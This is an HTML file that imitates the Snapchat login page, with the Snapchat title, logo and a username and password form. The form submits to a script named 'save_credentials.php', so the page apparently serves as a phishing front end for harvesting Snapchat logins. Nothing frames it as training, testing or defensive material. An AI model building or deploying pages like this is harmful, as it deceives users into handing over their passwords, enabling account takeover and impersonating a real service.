<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Log In</title>
    <link rel="stylesheet" href="Snapchat.css">
</head>
<body>
    <div class="container login-container">
        <img src="Snapchat.png" alt="Snapchat Logo" class="logo">
        <h1>Log In</h1>
        <form action="save_credentials.php" method="POST">
            <input type="text" name="username" class="login-input" placeholder="Username or Email" required>
            <input type="password" name="password" class="login-input" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-link">Forgot Password?</a>
        <p class="support-text">New to Snapchat? <a href="#">Sign Up</a></p>
    </div>
</body>
</html>
